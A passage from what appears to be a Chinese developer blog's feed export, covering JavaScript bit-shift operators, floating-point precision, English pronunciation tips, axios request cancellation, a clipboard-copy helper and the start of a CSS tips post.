class="built_in">color</span>.g, <span class="built_in">color</span>.b)</span><br><span class="line"><span class="comment">// &quot;#bada55&quot;</span></span><br></pre></td></tr></table></figure><p>上面代码使用左移运算符，将颜色的 RGB 值转为 HEX 值。</p><h2 id="右移运算符"><a href="#右移运算符" class="headerlink" title="右移运算符"></a>右移运算符</h2><h4 id="右移运算符（-gt-gt-）表示将一个数的二进制值向右移动指定的位数。如果是正数，头部全部补0；如果是负数，头部全部补1。右移运算符基本上相当于除以2的指定次方（最高位即符号位参与移动）。"><a href="#右移运算符（-gt-gt-）表示将一个数的二进制值向右移动指定的位数。如果是正数，头部全部补0；如果是负数，头部全部补1。右移运算符基本上相当于除以2的指定次方（最高位即符号位参与移动）。" class="headerlink" title="右移运算符（&gt;&gt;）表示将一个数的二进制值向右移动指定的位数。如果是正数，头部全部补0；如果是负数，头部全部补1。右移运算符基本上相当于除以2的指定次方（最高位即符号位参与移动）。"></a>右移运算符（<code>&gt;&gt;</code>）表示将一个数的二进制值向右移动指定的位数。如果是正数，头部全部补<code>0</code>；如果是负数，头部全部补<code>1</code>。右移运算符基本上相当于除以2的指定次方（最高位即符号位参与移动）。</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span> &gt;&gt; <span class="number">1</span></span><br><span class="line"><span class="regexp">//</span> <span class="number">2</span></span><br><span class="line">/*</span><br><span class="line"><span class="regexp">//</span> 因为<span class="number">4</span>的二进制形式为 <span class="number">00000000000000000000000000000100</span>，</span><br><span class="line"><span class="regexp">//</span> 右移一位得到 <span class="number">00000000000000000000000000000010</span>，</span><br><span class="line"><span class="regexp">//</span> 即为十进制的<span class="number">2</span></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">-<span class="number">4</span> &gt;&gt; <span class="number">1</span></span><br><span class="line"><span class="regexp">//</span> -<span class="number">2</span></span><br><span class="line">/*</span><br><span class="line"><span class="regexp">//</span> 因为-<span class="number">4</span>的二进制形式为 <span class="number">11111111111111111111111111111100</span>，</span><br><span class="line"><span class="regexp">//</span> 右移一位，头部补<span class="number">1</span>，得到 <span class="number">11111111111111111111111111111110</span>,</span><br><span class="line"><span class="regexp">//</span> 即为十进制的-<span class="number">2</span></span><br><span class="line">*/</span><br></pre></td></tr></table></figure><p>右移运算可以模拟 2 的整除运算。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5</span> &gt;&gt; <span class="number">1</span></span><br><span class="line"><span class="regexp">//</span> <span class="number">2</span></span><br><span class="line"><span class="regexp">//</span> 相当于 <span class="number">5</span> / <span class="number">2</span> = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="number">21</span> &gt;&gt; <span class="number">2</span></span><br><span class="line"><span class="regexp">//</span> <span class="number">5</span></span><br><span class="line"><span class="regexp">//</span> 相当于 <span class="number">21</span> / <span class="number">4</span> = <span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="number">21</span> &gt;&gt; <span class="number">3</span></span><br><span class="line"><span class="regexp">//</span> <span class="number">2</span></span><br><span class="line"><span class="regexp">//</span> 相当于 <span class="number">21</span> / <span class="number">8</span> = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="number">21</span> &gt;&gt; <span class="number">4</span></span><br><span class="line"><span class="regexp">//</span> <span class="number">1</span></span><br><span class="line"><span class="regexp">//</span> 相当于 <span class="number">21</span> / <span class="number">16</span> = <span class="number">1</span></span><br></pre></td></tr></table></figure><p>##头部补零的右移运算符</p><h4 id="头部补零的右移运算符（-gt-gt-gt-）与右移运算符（-gt-gt-）只有一个差别，就是一个数的二进制形式向右移动时，头部一律补零，而不考虑符号位。所以，该运算总是得到正值。对于正数，该运算的结果与右移运算符（-gt-gt-）完全一致，区别主要在于负数。"><a href="#头部补零的右移运算符（-gt-gt-gt-）与右移运算符（-gt-gt-）只有一个差别，就是一个数的二进制形式向右移动时，头部一律补零，而不考虑符号位。所以，该运算总是得到正值。对于正数，该运算的结果与右移运算符（-gt-gt-）完全一致，区别主要在于负数。" class="headerlink" title="头部补零的右移运算符（&gt;&gt;&gt;）与右移运算符（&gt;&gt;）只有一个差别，就是一个数的二进制形式向右移动时，头部一律补零，而不考虑符号位。所以，该运算总是得到正值。对于正数，该运算的结果与右移运算符（&gt;&gt;）完全一致，区别主要在于负数。"></a>头部补零的右移运算符（<code>&gt;&gt;&gt;</code>）与右移运算符（<code>&gt;&gt;</code>）只有一个差别，就是一个数的二进制形式向右移动时，头部一律补零，而不考虑符号位。所以，该运算总是得到正值。对于正数，该运算的结果与右移运算符（<code>&gt;&gt;</code>）完全一致，区别主要在于负数。</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span> &gt;&gt;&gt; <span class="number">1</span></span><br><span class="line"><span class="regexp">//</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line">-<span class="number">4</span> &gt;&gt;&gt; <span class="number">1</span></span><br><span class="line"><span class="regexp">//</span> <span class="number">2147483646</span></span><br><span class="line">/*</span><br><span class="line"><span class="regexp">//</span> 因为-<span class="number">4</span>的二进制形式为<span class="number">11111111111111111111111111111100</span>，</span><br><span class="line"><span class="regexp">//</span> 带符号位的右移一位，得到<span class="number">01111111111111111111111111111110</span>，</span><br><span class="line"><span class="regexp">//</span> 即为十进制的<span class="number">2147483646</span>。</span><br><span class="line">*/</span><br></pre></td></tr></table></figure><p>这个运算实际上将一个值转为32位无符号整数。</p><p>查看一个负整数在计算机内部的储存形式，最快的方法就是使用这个运算符。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-<span class="number">1</span> &gt;&gt;&gt; <span class="number">0</span> <span class="regexp">//</span> <span class="number">4294967295</span></span><br></pre></td></tr></table></figure><p>上面代码表示，<code>-1</code>作为<code>32</code>位整数时，内部的储存形式使用无符号整数格式解读，值为 4294967295（即(2^32)-1，等于<code>11111111111111111111111111111111</code>）。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li>Michal Budzynski, <a href="https://michalbe.blogspot.co.uk/2013/03/javascript-less-known-parts-bitwise.html">JavaScript: The less known parts. Bitwise Operators</a></li><li>Axel Rauschmayer, <a href="http://www.2ality.com/2013/06/basic-javascript.html">Basic JavaScript for the impatient programmer</a></li><li>Mozilla Developer Network, <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Bitwise_Operators">Bitwise Operators</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JS数值精度</title>
      <link href="/Blog/2020/04/20/javascript/JS%E6%95%B0%E5%80%BC%E7%B2%BE%E5%BA%A6/index/"/>
      <url>/Blog/2020/04/20/javascript/JS%E6%95%B0%E5%80%BC%E7%B2%BE%E5%BA%A6/index/</url>
      
        <content type="html"><![CDATA[<h5 id="整数和浮点数"><a href="#整数和浮点数" class="headerlink" title="整数和浮点数"></a>整数和浮点数</h5><p>JavaScript 内部，所有数字都是以64位浮点数形式储存，即使整数也是如此。所以，<code>1</code>与<code>1.0</code>是相同的，是同一个数。</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">1 </span>=== <span class="number">1.0</span> // true</span><br></pre></td></tr></table></figure><p>这就是说，JavaScript 语言的底层根本没有整数，所有数字都是小数（64位浮点数）。容易造成混淆的是，某些运算只有整数才能完成，此时 JavaScript 会自动把64位浮点数，转成32位整数，然后再进行运算，参见《运算符》一章的“位运算”部分。</p><p>由于浮点数不是精确的值，所以涉及小数的比较和运算要特别小心。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0.1</span> + <span class="number">0.2</span> === <span class="number">0.3</span></span><br><span class="line"><span class="regexp">//</span> false</span><br><span class="line"></span><br><span class="line"><span class="number">0.3</span> / <span class="number">0.1</span></span><br><span class="line"><span class="regexp">//</span> <span class="number">2.9999999999999996</span></span><br><span class="line"></span><br><span class="line">(<span class="number">0.3</span> - <span class="number">0.2</span>) === (<span class="number">0.2</span> - <span class="number">0.1</span>)</span><br><span class="line"><span class="regexp">//</span> false</span><br></pre></td></tr></table></figure><h5 id="数值精度"><a href="#数值精度" class="headerlink" title="数值精度"></a>数值精度</h5><p>根据国际标准 IEEE 754，JavaScript 浮点数的64个二进制位，从最左边开始，是这样组成的。</p><p>第1位：符号位，<code>0</code>表示正数，<code>1</code>表示负数<br>第2位到第12位（共11位）：指数部分<br>第13位到第64位（共52位）：小数部分（即有效数字）<br>符号位决定了一个数的正负，指数部分决定了数值的大小，小数部分决定了数值的精度。</p><p>指数部分一共有11个二进制位，因此大小范围就是0到2047。IEEE 754 规定，如果指数部分的值在0到2047之间（不含两个端点），那么有效数字的第一位默认总是1，不保存在64位浮点数之中。也就是说，有效数字这时总是<code>1.xx...xx</code>的形式，其中<code>xx..xx</code>的部分保存在64位浮点数之中，最长可能为52位。因此，JavaScript 提供的有效数字最长为53个二进制位。</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(-<span class="number">1</span>)^符号位 * <span class="number">1.</span>xx.<span class="built_in">..xx</span> * <span class="number">2</span>^指数部分</span><br></pre></td></tr></table></figure><p>上面公式是正常情况下（指数部分在0到2047之间），一个数在 JavaScript 内部实际的表示形式。</p><p>精度最多只能到53个二进制位，这意味着，绝对值小于2的53次方的整数，即-253到253，都可以精确表示。</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Math.<span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">53</span>)</span><br><span class="line"><span class="comment">// 9007199254740992</span></span><br><span class="line"></span><br><span class="line">Math.<span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">53</span>) + <span class="number">1</span></span><br><span class="line"><span class="comment">// 9007199254740992</span></span><br><span class="line"></span><br><span class="line">Math.<span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">53</span>) + <span class="number">2</span></span><br><span class="line"><span class="comment">// 9007199254740994</span></span><br><span class="line"></span><br><span class="line">Math.<span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">53</span>) + <span class="number">3</span></span><br><span class="line"><span class="comment">// 9007199254740996</span></span><br><span class="line"></span><br><span class="line">Math.<span class="built_in">pow</span>(<span class="number">2</span>, <span class="number">53</span>) + <span class="number">4</span></span><br><span class="line"><span class="comment">// 9007199254740996</span></span><br></pre></td></tr></table></figure><p>上面代码中，大于2的53次方以后，整数运算的结果开始出现错误。所以，大于2的53次方的数值，都无法保持精度。由于2的53次方是一个16位的十进制数值，所以简单的法则就是，JavaScript 对15位的十进制数都可以精确处理。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Math.pow(<span class="number">2</span>, <span class="number">53</span>)</span><br><span class="line"><span class="regexp">//</span> <span class="number">9007199254740992</span></span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> 多出的三个有效数字，将无法保存</span><br><span class="line"><span class="number">9007199254740992111</span></span><br><span class="line"><span class="regexp">//</span> <span class="number">9007199254740992000</span></span><br></pre></td></tr></table></figure><p>上面示例表明，大于2的53次方以后，多出来的有效数字（最后三位的<code>111</code>）都会无法保存，变成0。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://en.wikipedia.org/wiki/IEEE_754">https://en.wikipedia.org/wiki/IEEE_754</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>序章</title>
      <link href="/Blog/2020/04/19/CEnglish/%E5%BA%8F%E7%AB%A0/index/"/>
      <url>/Blog/2020/04/19/CEnglish/%E5%BA%8F%E7%AB%A0/index/</url>
      
        <content type="html"><![CDATA[<p>#英音与美音的区别？</p><blockquote><p>英音没有儿化音，美音有读， 没有不读</p></blockquote><p>#48个音</p><h3 id="x2F-i-x2F-上下牙之间小拇指"><a href="#x2F-i-x2F-上下牙之间小拇指" class="headerlink" title="&#x2F;i&#x2F; 上下牙之间小拇指"></a>&#x2F;i&#x2F; 上下牙之间小拇指</h3><blockquote><p>sit &#x2F;sit&#x2F;<br>busy &#x2F;bizi&#x2F; （当口语时会以a结尾）</p></blockquote><h3 id="x2F-l-x2F-舌尖顶上齿龈"><a href="#x2F-l-x2F-舌尖顶上齿龈" class="headerlink" title="&#x2F;l&#x2F; 舌尖顶上齿龈"></a>&#x2F;l&#x2F; 舌尖顶上齿龈</h3><blockquote><p>world &#x2F;we:ld&#x2F;<br>word &#x2F;we:d&#x2F;</p></blockquote><h3 id="x2F-il-x2F-x3D-x3D-x2F-u-x2F"><a href="#x2F-il-x2F-x3D-x3D-x2F-u-x2F" class="headerlink" title="&#x2F;il&#x2F; !&#x3D;&#x3D; &#x2F;u:&#x2F;"></a>&#x2F;il&#x2F; !&#x3D;&#x3D; &#x2F;u:&#x2F;</h3><blockquote><p>build &#x2F;bild&#x2F;<br>milk &#x2F;milk&#x2F;</p></blockquote><h3 id="x2F-r-x2F-圆唇，卷舌，吐气"><a href="#x2F-r-x2F-圆唇，卷舌，吐气" class="headerlink" title="&#x2F;r&#x2F; 圆唇，卷舌，吐气"></a>&#x2F;r&#x2F; 圆唇，卷舌，吐气</h3><blockquote><p>rose 不读 肉丝 读 若哦(延长)子</p></blockquote><h1 id="口语技巧"><a href="#口语技巧" class="headerlink" title="口语技巧"></a>口语技巧</h1><h2 id="重叠现象-x2F-辅音➕元音"><a href="#重叠现象-x2F-辅音➕元音" class="headerlink" title="重叠现象 &#x2F; 辅音➕元音"></a>重叠现象 &#x2F; 辅音➕元音</h2><blockquote><p>Clas<del><strong>s</strong></del> <strong>s</strong>tart<strong>s</strong> <strong>i</strong>n 20 minutes</p></blockquote><h3 id="重叠"><a href="#重叠" class="headerlink" title="重叠"></a>重叠</h3><blockquote><p>roo<del>m</del>mate<br>wha<del>t</del> time<br>ta<del>ke</del> care</p></blockquote><h3 id="辅音➕元音-加粗部分连读-是连读，不是省略！"><a href="#辅音➕元音-加粗部分连读-是连读，不是省略！" class="headerlink" title="辅音➕元音(加粗部分连读(是连读，不是省略！))"></a>辅音➕元音(加粗部分连读(是连读，不是省略！))</h3><blockquote><p>ta<strong>ke o</strong>ff<br> stan<strong>d u</strong>p</p></blockquote><h2 id="重叠现象-x2F-失去爆破"><a href="#重叠现象-x2F-失去爆破" class="headerlink" title="重叠现象 &#x2F; 失去爆破"></a>重叠现象 &#x2F; 失去爆破</h2><blockquote><p>I don’<strong>t</strong> wan<strong>t t</strong>o do li<strong>k</strong>e this (口语want 和 to 在一起时读wanan)</p></blockquote><h3 id="失去爆破-（p-b-t-d-k-g）-连续出现时，前者省略"><a href="#失去爆破-（p-b-t-d-k-g）-连续出现时，前者省略" class="headerlink" title="失去爆破 （p b t d k g）(连续出现时，前者省略)"></a>失去爆破 （p b t d k g）(连续出现时，前者省略)</h3><blockquote><p>blac<strong>kb</strong>orad<br>goo<strong>db</strong>ye<br>sto<strong>p t</strong>alking<br>goo<strong>d t</strong>ime</p></blockquote><h3 id="同化现象-x2F-失去爆破-x2F-重叠现象-x2F-辅音➕元音"><a href="#同化现象-x2F-失去爆破-x2F-重叠现象-x2F-辅音➕元音" class="headerlink" title="同化现象 &#x2F; 失去爆破 &#x2F; 重叠现象 &#x2F; 辅音➕元音"></a>同化现象 &#x2F; 失去爆破 &#x2F; 重叠现象 &#x2F; 辅音➕元音</h3><blockquote><p>Woul<strong>d y</strong>ou li<strong>ke t</strong>o tal<strong>k a</strong>bou<strong>t t</strong>his frien<del>d</del> （口语friend d轻读或不读）</p></blockquote><h2 id="认知连读方式"><a href="#认知连读方式" class="headerlink" title="认知连读方式"></a>认知连读方式</h2><blockquote><p>1.找–辅音➕元音<br>2.找–失去爆破<br>3.找–重叠，同化<br>4.找–美式浊化（美式英语）🌰：当<code>t</code>在两个元音之间时读 <code>d</code> 如： water &#x3D;&gt; wader</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> chrome调试技巧 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>axios 取消请求</title>
      <link href="/Blog/2020/04/14/essay/axios%E5%8F%96%E6%B6%88%E8%AF%B7%E6%B1%82/index/"/>
      <url>/Blog/2020/04/14/essay/axios%E5%8F%96%E6%B6%88%E8%AF%B7%E6%B1%82/index/</url>
      
        <content type="html"><![CDATA[<h2 id="axios文档里介绍的取消axios请求有以下两种方式："><a href="#axios文档里介绍的取消axios请求有以下两种方式：" class="headerlink" title="axios文档里介绍的取消axios请求有以下两种方式："></a>axios文档里介绍的取消axios请求有以下两种方式：</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第一种：使用 CancelToken</span></span><br><span class="line"><span class="keyword">const</span> &#123; CancelToken, isCanCel &#125; = axios;</span><br><span class="line"><span class="keyword">const</span> source = CancelToken.source();</span><br><span class="line"></span><br><span class="line">axios.<span class="keyword">get</span>(<span class="string">&#x27;/user/12345&#x27;</span>, &#123;</span><br><span class="line">  cancelToken: source.token</span><br><span class="line">&#125;).<span class="keyword">catch</span>(thrown =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (isCancel(thrown)) &#123;</span><br><span class="line">      <span class="comment">// 获取 取消请求 的相关信息</span></span><br><span class="line">    console.log(<span class="string">&#x27;Request canceled&#x27;</span>, thrown.message);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 处理其他异常</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">axios.post(<span class="string">&#x27;/user/12345&#x27;</span>, &#123;</span><br><span class="line">  name: <span class="string">&#x27;new name&#x27;</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">  cancelToken: source.token</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 取消请求。</span></span><br><span class="line">source.cancel(<span class="string">&#x27;Operation canceled by the user.&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二种：还可以通过传递一个 executor 函数到 CancelToken 的构造函数来创建 cancel token：</span></span><br><span class="line"><span class="keyword">const</span> CancelToken = axios.CancelToken;</span><br><span class="line"><span class="keyword">let</span> cancel;</span><br><span class="line"></span><br><span class="line">axios.<span class="keyword">get</span>(<span class="string">&#x27;/user/12345&#x27;</span>, &#123;</span><br><span class="line">  cancelToken: <span class="keyword">new</span> CancelToken(<span class="function">function <span class="title">executor</span>(<span class="params">c</span>)</span> &#123;</span><br><span class="line">    <span class="comment">// executor 函数接收一个 cancel 函数作为参数</span></span><br><span class="line">    cancel = c;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 取消请求</span></span><br><span class="line">cancel();</span><br></pre></td></tr></table></figure><h2 id="举🌰：切换路由时，取消上个路由的请求。"><a href="#举🌰：切换路由时，取消上个路由的请求。" class="headerlink" title="举🌰：切换路由时，取消上个路由的请求。"></a>举🌰：切换路由时，取消上个路由的请求。</h2><p>其实我们的解决方式就是同一个路由下的请求公用一个canceltoken，虽然多个请求会生成多个promise链，但是在adapterPromise局部的cancelToken.promise却是同一个，这样在执行axios.cancelToken.source().cancel方法时候就会作用于全部promise链，一旦cancel一执行，所有未完成的请求都会取消，相对应的promise链都会变为rejected。</p><p>初始入口文件中通过axios生成cancelToken:</p><p><img src="/Blog/2020/04/14/essay/axios%E5%8F%96%E6%B6%88%E8%AF%B7%E6%B1%82/index/img.png"></p><p>axios的拦截器的request配置中添加参数cancelToken</p><p><img src="/Blog/2020/04/14/essay/axios%E5%8F%96%E6%B6%88%E8%AF%B7%E6%B1%82/index/img_1.png"></p><h2 id="一个请求在axios的工作流程，像一个管道一样："><a href="#一个请求在axios的工作流程，像一个管道一样：" class="headerlink" title="一个请求在axios的工作流程，像一个管道一样："></a>一个请求在axios的工作流程，像一个管道一样：</h2><p><img src="/Blog/2020/04/14/essay/axios%E5%8F%96%E6%B6%88%E8%AF%B7%E6%B1%82/index/img_2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>简单的复制文本到剪切板</title>
      <link href="/Blog/2020/04/14/essay/%E7%AE%80%E5%8D%95%E7%9A%84%E5%A4%8D%E5%88%B6%E6%96%87%E6%9C%AC%E5%88%B0%E5%89%AA%E5%88%87%E6%9D%BF/index/"/>
      <url>/Blog/2020/04/14/essay/%E7%AE%80%E5%8D%95%E7%9A%84%E5%A4%8D%E5%88%B6%E6%96%87%E6%9C%AC%E5%88%B0%E5%89%AA%E5%88%87%E6%9D%BF/index/</url>
      
        <content type="html"><![CDATA[<h1 id="copyTextToClipboard"><a href="#copyTextToClipboard" class="headerlink" title="copyTextToClipboard"></a>copyTextToClipboard</h1><h3 id="直接调用会出现-DOMException-Document-is-not-focused"><a href="#直接调用会出现-DOMException-Document-is-not-focused" class="headerlink" title="直接调用会出现 DOMException: Document is not focused."></a>直接调用会出现 <code>DOMException: Document is not focused.</code></h3><h4 id="最好主动触发，如-click-后调用"><a href="#最好主动触发，如-click-后调用" class="headerlink" title="最好主动触发，如 click 后调用"></a>最好主动触发，如 <code>click</code> 后调用</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> clipboardCopy (text) &#123;</span><br><span class="line">  <span class="keyword">if</span> (navigator.clipboard) &#123; <span class="comment">// 如果浏览器兼容该 API</span></span><br><span class="line">    return navigator.clipboard.write<span class="constructor">Text(<span class="params">text</span>)</span>.catch(<span class="keyword">function</span> (err) &#123;</span><br><span class="line">      throw (err !== undefined ? err : <span class="keyword">new</span> <span class="constructor">DOMException(&#x27;The <span class="params">request</span> <span class="params">is</span> <span class="params">not</span> <span class="params">allowed</span>&#x27;, &#x27;NotAllowedError&#x27;)</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 或者使用 document.execCommand()</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 把需要复制的文本放入 &lt;span&gt;</span></span><br><span class="line">  const span = document.create<span class="constructor">Element(&#x27;<span class="params">span</span>&#x27;)</span></span><br><span class="line">  span.textContent = text</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 保留文本样式</span></span><br><span class="line">  span.style.whiteSpace = &#x27;pre&#x27;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 把 &lt;span&gt; 放进页面</span></span><br><span class="line">  document.body.append<span class="constructor">Child(<span class="params">span</span>)</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 创建选择区域</span></span><br><span class="line">  const selection = window.get<span class="constructor">Selection()</span></span><br><span class="line">  const range = window.document.create<span class="constructor">Range()</span></span><br><span class="line">  selection.remove<span class="constructor">AllRanges()</span></span><br><span class="line">  range.select<span class="constructor">Node(<span class="params">span</span>)</span></span><br><span class="line">  selection.add<span class="constructor">Range(<span class="params">range</span>)</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 复制文本到剪切板</span></span><br><span class="line">  <span class="keyword">let</span> success = <span class="literal">false</span></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    success = window.document.exec<span class="constructor">Command(&#x27;<span class="params">copy</span>&#x27;)</span></span><br><span class="line">  &#125; catch (err) &#123;</span><br><span class="line">    console.log(&#x27;error&#x27;, err)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 清除战场</span></span><br><span class="line">  selection.remove<span class="constructor">AllRanges()</span></span><br><span class="line">  window.document.body.remove<span class="constructor">Child(<span class="params">span</span>)</span></span><br><span class="line"></span><br><span class="line">  return success</span><br><span class="line">    ? <span class="module-access"><span class="module"><span class="identifier">Promise</span>.</span></span>resolve<span class="literal">()</span></span><br><span class="line">    : <span class="module-access"><span class="module"><span class="identifier">Promise</span>.</span></span>reject(<span class="keyword">new</span> <span class="constructor">DOMException(&#x27;The <span class="params">request</span> <span class="params">is</span> <span class="params">not</span> <span class="params">allowed</span>&#x27;, &#x27;NotAllowedError&#x27;)</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CSS开发技巧(值得收藏)</title>
      <link href="/Blog/2020/01/09/essay/CSS%E5%BC%80%E5%8F%91%E6%8A%80%E5%B7%A7(%E5%80%BC%E5%BE%97%E6%94%B6%E8%97%8F)/index/"/>
      <url>/Blog/2020/01/09/essay/CSS%E5%BC%80%E5%8F%91%E6%8A%80%E5%B7%A7(%E5%80%BC%E5%BE%97%E6%94%B6%E8%97%8F)/index/</url>
      
        <content type="html"><![CDATA[<h2 id="1-每个单词的首字母大写"><a href="#1-每个单词的首字母大写" class="headerlink" title="1. 每个单词的首字母大写"></a>1. 每个单词的首字母大写</h2><ul><li>要点：通过 <code>text-transform</code> 调正文字</li><li>场景：每个单词的首字母大写，摆脱一味 <code>JS</code> 的控制</li><li>兼容：all：<a href="https://caniuse.com/#search=text-transform">text-transform</a></li><li>代码：<a href="http://js.jirengu.com/popuc/2/edit?html,css,output">在线演示</a></li></ul><p><img src="/Blog/2020/01/09/essay/CSS%E5%BC%80%E5%8F%91%E6%8A%80%E5%B7%A7(%E5%80%BC%E5%BE%97%E6%94%B6%E8%97%8F)/index/img.png"></p><h2 id="2-使用input-checked单选高亮"><a href="#2-使用input-checked单选高亮" class="headerlink" title="2.使用input:checked单选高亮"></a>2.使用input:checked单选高亮</h2><ul><li>要点：通过 <code>input:checked</code> 单选高亮</li><li>场景：单选高亮（之前做 pc 端的客户画像需求时，遇到需要左右两边等到的需求（左边块的高度会随着内容变化）），摆脱一味 <code>JS</code> 的控制</li><li>兼容：<a href="https://caniuse.com/#search=%3Achecked">text-transform</a></li><li>代码：<a href="http://js.jirengu.com/lewoc/5/edit?html,css,output">在线演示</a></li></ul><p><img 